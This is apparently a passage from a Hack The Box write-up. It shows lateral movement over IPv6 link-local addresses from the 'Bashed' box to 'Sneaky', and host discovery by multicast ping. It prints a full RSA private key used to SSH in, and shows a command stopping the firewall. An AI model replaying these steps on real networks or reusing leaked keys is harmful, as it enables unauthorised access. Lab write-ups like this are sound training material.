fc00::/7  - Unique Local Unicast -> 10.x.x.x, 172.16.x.x, 192.168.x.x -> Private IP
2000::/3  - Global Unicast -> Routable addresses

FF02::1 - Multicast All nodes
FF02::2 - Multicast ROUTER nodes
```

- [Range-Subnet](http://www.gestioip.net/cgi-bin/subnet_calculator.cgi)

```
fe80::/10

fe80:0000:0000:0000:0000:0000:0000:0000
febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

```
fc00::/7

fc00:0000:0000:0000:0000:0000:0000:0000
fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

```
2000::/3

2000:0000:0000:0000:0000:0000:0000:0000
3fff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

###### Method 1 - Hopping on the htb network

- Leveraging the fact that `admin` failed to set separate IPv6 rules
- `fe80` addresses are routable if we are on the same broadcast domain/network
- On `Bashed`

```sh
root@bashed:~# /sbin/ifconfig
ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:39:ea
          inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
          inet6 addr: dead:beef::250:56ff:fe8f:39ea/64 Scope:Global
          inet6 addr: fe80::250:56ff:fe8f:39ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:6179 errors:0 dropped:10 overruns:0 frame:0
          TX packets:3134 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:741401 (741.4 KB)  TX bytes:326129 (326.1 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:144994 errors:0 dropped:0 overruns:0 frame:0
          TX packets:144994 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:10730016 (10.7 MB)  TX bytes:10730016 (10.7 MB)

root@bashed:~#
```

[`IPv6 - MAC to IP converter`](http://ben.akrin.com/?p=1347)

- For `Bashed`
 
```
MAC -> 00:50:56:8f:39:ea -> 0050:568f:39ea
IPv6 Link Local -> fe80::250:56ff:fe8f:64fe -> fe80::0250:56ff:fe8f:64fe
```

IPv4          | IPv6
--------------|--------------------------------
ARP Poisoning | Neighbor Advertisement Spoofing

```sh
root@bashed:~# ping 10.10.10.20
PING 10.10.10.20 (10.10.10.20) 56(84) bytes of data.
From 10.10.10.2: icmp_seq=1 Redirect Host(New nexthop: 10.10.10.20)
From 10.10.10.2: icmp_seq=2 Redirect Host(New nexthop: 10.10.10.20)
64 bytes from 10.10.10.20: icmp_seq=3 ttl=64 time=0.206 ms
64 bytes from 10.10.10.20: icmp_seq=4 ttl=64 time=0.224 ms
64 bytes from 10.10.10.20: icmp_seq=5 ttl=64 time=0.361 ms
64 bytes from 10.10.10.20: icmp_seq=6 ttl=64 time=0.160 ms
^C
--- 10.10.10.20 ping statistics ---
6 packets transmitted, 4 received, 33% packet loss, time 5000ms
rtt min/avg/max/mdev = 0.160/0.237/0.361/0.077 ms
root@bashed:~#
```

```sh
root@bashed:~# /usr/sbin/arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.10.10.2               ether   00:50:56:8f:64:fe   C                     ens33
10.10.10.20              ether   00:50:56:8f:d7:6e   C                     ens33
root@bashed:~#
```

- For `Sneaky`

```
MAC -> 00:50:56:8f:d7:6e -> 0050:568f:d76e
IPv6 Link Local -> fe80::250:56ff:fe8f:d76e -> fe80::0250:56ff:fe8f:d76e
```

```sh
root@bashed:~# ping6 fe80::0250:56ff:fe8f:d76e%ens33
PING fe80::0250:56ff:fe8f:d76e%ens33(fe80::250:56ff:fe8f:d76e) 56 data bytes
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=1 ttl=64 time=0.182 ms
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=2 ttl=64 time=0.205 ms
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=3 ttl=64 time=0.200 ms
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=4 ttl=64 time=0.189 ms
^C
--- fe80::0250:56ff:fe8f:d76e%ens33 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 0.182/0.194/0.205/0.009 ms
root@bashed:~#
```

```sh
root@bashed:~# cat sneaky.key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
-----END RSA PRIVATE KEY-----
root@bashed:~#
```

```sh
root@bashed:~# ssh -i sneaky.key thrasivoulos@fe80::0250:56ff:fe8f:d76e%ens33
The authenticity of host 'fe80::0250:56ff:fe8f:d76e%ens33 (fe80::250:56ff:fe8f:d76e%ens33)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'fe80::0250:56ff:fe8f:d76e%ens33,fe80::250:56ff:fe8f:d76e%ens33' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Jun  4 05:25:55 EEST 2018

  System load: 0.0               Memory usage: 4%   Processes:       177
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:8f:d7:6e
          inet addr:10.10.10.20  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:d76e/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:fe8f:d76e/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1377996 errors:0 dropped:88 overruns:0 frame:0
          TX packets:889275 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:116020319 (116.0 MB)  TX bytes:158084228 (158.0 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:4480 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4480 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:454720 (454.7 KB)  TX bytes:454720 (454.7 KB)

thrasivoulos@Sneaky:~$
```

###### Method 2 - Enumerating Networks by pinging Multicast

```sh
root@bashed:~# /usr/sbin/arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.10.10.2               ether   00:50:56:8f:64:fe   C                     ens33
10.10.10.20              ether   00:50:56:8f:d7:6e   C                     ens33
root@bashed:~#
```

```sh
root@bashed:~# ip -6 neigh
fe80::250:56ff:feaa:4146 dev ens33  FAILED
fe80::250:56ff:fe8f:64fe dev ens33 lladdr 00:50:56:8f:64:fe router STALE
fe80::250:56ff:feaa:d76e dev ens33  FAILED
fe80::250:56ff:fe8f:d76e dev ens33 lladdr 00:50:56:8f:d7:6e REACHABLE
root@bashed:~#
```

```sh
root@bashed:~# ping6 -I ens33 ff02::1
PING ff02::1(ff02::1) from fe80::250:56ff:fe8f:39ea ens33: 56 data bytes
64 bytes from fe80::250:56ff:fe8f:39ea: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from fe80::250:56ff:fe8f:64fe: icmp_seq=1 ttl=64 time=0.182 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=1 ttl=64 time=0.311 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:29df: icmp_seq=1 ttl=64 time=0.603 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:7100: icmp_seq=1 ttl=64 time=0.608 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1e33: icmp_seq=1 ttl=64 time=0.629 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:9c92: icmp_seq=1 ttl=64 time=0.646 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1299: icmp_seq=1 ttl=64 time=0.701 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:6524: icmp_seq=1 ttl=64 time=0.706 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fbdf: icmp_seq=1 ttl=64 time=0.752 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:239e: icmp_seq=1 ttl=64 time=0.771 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:c237: icmp_seq=1 ttl=64 time=0.773 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:65: icmp_seq=1 ttl=64 time=0.809 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fa4b: icmp_seq=1 ttl=64 time=0.815 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:8262: icmp_seq=1 ttl=64 time=0.828 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1ecd: icmp_seq=1 ttl=64 time=0.925 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:cd94: icmp_seq=1 ttl=64 time=1.11 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d32c: icmp_seq=1 ttl=64 time=302 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:39ea: icmp_seq=2 ttl=64 time=0.035 ms
64 bytes from fe80::250:56ff:fe8f:64fe: icmp_seq=2 ttl=64 time=0.197 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:29df: icmp_seq=2 ttl=64 time=0.270 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:7100: icmp_seq=2 ttl=64 time=0.309 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1e33: icmp_seq=2 ttl=64 time=0.398 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:8262: icmp_seq=2 ttl=64 time=0.403 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:c237: icmp_seq=2 ttl=64 time=0.420 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:9c92: icmp_seq=2 ttl=64 time=0.422 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=2 ttl=64 time=0.424 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d32c: icmp_seq=2 ttl=64 time=0.464 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:239e: icmp_seq=2 ttl=64 time=0.476 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1299: icmp_seq=2 ttl=64 time=0.488 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:65: icmp_seq=2 ttl=64 time=0.490 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fa4b: icmp_seq=2 ttl=64 time=0.506 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1ecd: icmp_seq=2 ttl=64 time=0.564 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fbdf: icmp_seq=2 ttl=64 time=0.568 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:6524: icmp_seq=2 ttl=64 time=0.680 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:cd94: icmp_seq=2 ttl=64 time=0.819 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:39ea: icmp_seq=3 ttl=64 time=0.038 ms
64 bytes from fe80::250:56ff:fe8f:7100: icmp_seq=3 ttl=64 time=0.242 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:29df: icmp_seq=3 ttl=64 time=0.266 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:8262: icmp_seq=3 ttl=64 time=0.268 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:c237: icmp_seq=3 ttl=64 time=0.311 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:9c92: icmp_seq=3 ttl=64 time=0.317 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1e33: icmp_seq=3 ttl=64 time=0.318 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=3 ttl=64 time=0.322 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fa4b: icmp_seq=3 ttl=64 time=0.353 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1299: icmp_seq=3 ttl=64 time=0.378 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d32c: icmp_seq=3 ttl=64 time=0.387 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1ecd: icmp_seq=3 ttl=64 time=0.455 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:64fe: icmp_seq=3 ttl=64 time=0.457 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fbdf: icmp_seq=3 ttl=64 time=0.468 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:239e: icmp_seq=3 ttl=64 time=0.540 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:65: icmp_seq=3 ttl=64 time=0.593 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:6524: icmp_seq=3 ttl=64 time=0.614 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:cd94: icmp_seq=3 ttl=64 time=0.724 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:39ea: icmp_seq=4 ttl=64 time=0.044 ms
64 bytes from fe80::250:56ff:fe8f:64fe: icmp_seq=4 ttl=64 time=0.252 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:29df: icmp_seq=4 ttl=64 time=0.257 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:c237: icmp_seq=4 ttl=64 time=0.304 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:7100: icmp_seq=4 ttl=64 time=0.311 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:8262: icmp_seq=4 ttl=64 time=0.315 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1e33: icmp_seq=4 ttl=64 time=0.354 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:9c92: icmp_seq=4 ttl=64 time=0.358 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d32c: icmp_seq=4 ttl=64 time=0.443 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=4 ttl=64 time=0.446 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1ecd: icmp_seq=4 ttl=64 time=0.470 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fa4b: icmp_seq=4 ttl=64 time=0.478 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:239e: icmp_seq=4 ttl=64 time=0.479 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1299: icmp_seq=4 ttl=64 time=0.480 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:65: icmp_seq=4 ttl=64 time=0.485 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fbdf: icmp_seq=4 ttl=64 time=0.549 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:6524: icmp_seq=4 ttl=64 time=0.553 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:cd94: icmp_seq=4 ttl=64 time=0.718 ms (DUP!)
^C
--- ff02::1 ping statistics ---
4 packets transmitted, 4 received, +68 duplicates, 0% packet loss, time 3001ms
rtt min/avg/max/mdev = 0.035/4.667/302.550/35.352 ms
root@bashed:~#
```

```sh
root@bashed:~# ip -6 neigh
fe80::250:56ff:fe8f:6524 dev ens33 lladdr 00:50:56:8f:65:24 REACHABLE
fe80::250:56ff:fe8f:239e dev ens33 lladdr 00:50:56:8f:23:9e REACHABLE
fe80::250:56ff:fe8f:1e33 dev ens33 lladdr 00:50:56:8f:1e:33 REACHABLE
fe80::250:56ff:fe8f:64fe dev ens33 lladdr 00:50:56:8f:64:fe router REACHABLE
fe80::250:56ff:fe8f:cd94 dev ens33 lladdr 00:50:56:8f:cd:94 REACHABLE
fe80::250:56ff:fe8f:7100 dev ens33 lladdr 00:50:56:8f:71:00 REACHABLE
fe80::250:56ff:fe8f:d32c dev ens33 lladdr 00:50:56:8f:d3:2c REACHABLE
fe80::250:56ff:fe8f:9c92 dev ens33 lladdr 00:50:56:8f:9c:92 REACHABLE
fe80::250:56ff:fe8f:1ecd dev ens33 lladdr 00:50:56:8f:1e:cd REACHABLE
fe80::250:56ff:fe8f:fa4b dev ens33 lladdr 00:50:56:8f:fa:4b REACHABLE
fe80::250:56ff:fe8f:29df dev ens33 lladdr 00:50:56:8f:29:df REACHABLE
fe80::250:56ff:fe8f:65 dev ens33 lladdr 00:50:56:8f:00:65 REACHABLE
fe80::250:56ff:fe8f:d76e dev ens33 lladdr 00:50:56:8f:d7:6e REACHABLE
fe80::250:56ff:feaa:d76e dev ens33  FAILED
fe80::250:56ff:fe8f:8262 dev ens33 lladdr 00:50:56:8f:82:62 REACHABLE
fe80::250:56ff:fe8f:c237 dev ens33 lladdr 00:50:56:8f:c2:37 REACHABLE
fe80::250:56ff:feaa:4146 dev ens33  FAILED
fe80::250:56ff:fe8f:fbdf dev ens33 lladdr 00:50:56:8f:fb:df REACHABLE
fe80::250:56ff:fe8f:1299 dev ens33 lladdr 00:50:56:8f:12:99 REACHABLE
root@bashed:~#
```

```sh
root@bashed:~# /sbin/iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
root@bashed:~#
```

```sh
root@bashed:~# /usr/sbin/service ufw stop
```

```sh
root@bashed:~# /sbin/iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
root@bashed:~#
```

```sh
root@bashed:~# ping6 -I ens33 ff02::1
PING ff02::1(ff02::1) from fe80::250:56ff:fe8f:39ea ens33: 56 data bytes
64 bytes from fe80::250:56ff:fe8f:39ea: icmp_seq=1 ttl=64 time=0.027 ms
64 bytes from fe80::250:56ff:fe8f:64fe: icmp_seq=1 ttl=64 time=0.125 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1e33: icmp_seq=1 ttl=64 time=0.332 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:c237: icmp_seq=1 ttl=64 time=0.336 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:29df: icmp_seq=1 ttl=64 time=0.362 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:9c92: icmp_seq=1 ttl=64 time=0.383 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fa4b: icmp_seq=1 ttl=64 time=0.423 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1299: icmp_seq=1 ttl=64 time=0.458 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fbdf: icmp_seq=1 ttl=64 time=0.484 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:65: icmp_seq=1 ttl=64 time=0.485 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=1 ttl=64 time=0.509 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:239e: icmp_seq=1 ttl=64 time=0.574 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1ecd: icmp_seq=1 ttl=64 time=0.593 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:cd94: icmp_seq=1 ttl=64 time=0.661 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:6524: icmp_seq=1 ttl=64 time=0.830 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:7100: icmp_seq=1 ttl=64 time=0.847 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:8262: icmp_seq=1 ttl=64 time=3.99 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d32c: icmp_seq=1 ttl=64 time=130 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:39ea: icmp_seq=2 ttl=64 time=0.040 ms
64 bytes from fe80::250:56ff:fe8f:64fe: icmp_seq=2 ttl=64 time=0.302 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:29df: icmp_seq=2 ttl=64 time=0.309 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:c237: icmp_seq=2 ttl=64 time=0.310 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:8262: icmp_seq=2 ttl=64 time=0.322 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:9c92: icmp_seq=2 ttl=64 time=0.323 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:7100: icmp_seq=2 ttl=64 time=0.324 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d76e: icmp_seq=2 ttl=64 time=0.342 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fa4b: icmp_seq=2 ttl=64 time=0.393 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:65: icmp_seq=2 ttl=64 time=0.454 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:fbdf: icmp_seq=2 ttl=64 time=0.459 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1e33: icmp_seq=2 ttl=64 time=0.510 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:239e: icmp_seq=2 ttl=64 time=0.570 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1299: icmp_seq=2 ttl=64 time=0.619 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:1ecd: icmp_seq=2 ttl=64 time=0.875 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:6524: icmp_seq=2 ttl=64 time=0.882 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:cd94: icmp_seq=2 ttl=64 time=1.06 ms (DUP!)
64 bytes from fe80::250:56ff:fe8f:d32c: icmp_seq=2 ttl=64 time=59.4 ms (DUP!)
^C
--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +34 duplicates, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.027/5.810/130.235/23.155 ms
root@bashed:~#
```

```sh
root@bashed:~# /sbin/ifconfig
ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:39:ea
          inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
          inet6 addr: dead:beef::250:56ff:fe8f:39ea/64 Scope:Global
          inet6 addr: fe80::250:56ff:fe8f:39ea/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7237 errors:0 dropped:10 overruns:0 frame:0
          TX packets:3832 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:834020 (834.0 KB)  TX bytes:415436 (415.4 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:153666 errors:0 dropped:0 overruns:0 frame:0
          TX packets:153666 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:11373952 (11.3 MB)  TX bytes:11373952 (11.3 MB)

root@bashed:~#
```

```sh
root@bashed:~# ping6 -I dead:beef::250:56ff:fe8f:39ea ff02::1
PING ff02::1(ff02::1) from dead:beef::250:56ff:fe8f:39ea : 56 data bytes
64 bytes from dead:beef::250:56ff:fe8f:39ea: icmp_seq=1 ttl=64 time=0.072 ms
64 bytes from dead:beef::1: icmp_seq=1 ttl=64 time=0.754 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:29df: icmp_seq=1 ttl=64 time=0.782 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:9c92: icmp_seq=1 ttl=64 time=0.785 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:c237: icmp_seq=1 ttl=64 time=0.788 ms (DUP!)
64 bytes from dead:beef::f42d:2c8:e958:4f46: icmp_seq=1 ttl=64 time=0.789 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1e33: icmp_seq=1 ttl=64 time=0.810 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1299: icmp_seq=1 ttl=64 time=0.812 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:fa4b: icmp_seq=1 ttl=64 time=0.813 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:fbdf: icmp_seq=1 ttl=64 time=0.814 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:65: icmp_seq=1 ttl=64 time=0.815 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:d76e: icmp_seq=1 ttl=64 time=0.816 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:6524: icmp_seq=1 ttl=64 time=0.865 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:cd94: icmp_seq=1 ttl=64 time=0.908 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1ecd: icmp_seq=1 ttl=64 time=0.910 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:239e: icmp_seq=1 ttl=64 time=0.991 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:8262: icmp_seq=1 ttl=64 time=2.89 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:d32c: icmp_seq=1 ttl=64 time=323 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:39ea: icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from dead:beef::1: icmp_seq=2 ttl=64 time=0.227 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:29df: icmp_seq=2 ttl=64 time=0.269 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:c237: icmp_seq=2 ttl=64 time=0.325 ms (DUP!)
64 bytes from dead:beef::f42d:2c8:e958:4f46: icmp_seq=2 ttl=64 time=0.340 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1e33: icmp_seq=2 ttl=64 time=0.380 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:8262: icmp_seq=2 ttl=64 time=0.399 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:9c92: icmp_seq=2 ttl=64 time=0.461 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:fa4b: icmp_seq=2 ttl=64 time=0.467 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:d32c: icmp_seq=2 ttl=64 time=0.476 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:1ecd: icmp_seq=2 ttl=64 time=0.478 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:65: icmp_seq=2 ttl=64 time=0.536 ms (DUP!)
64 bytes from dead:beef::250:56ff:fe8f:239e: icmp_seq=2 ttl=64 time=0.600 ms (DUP!)
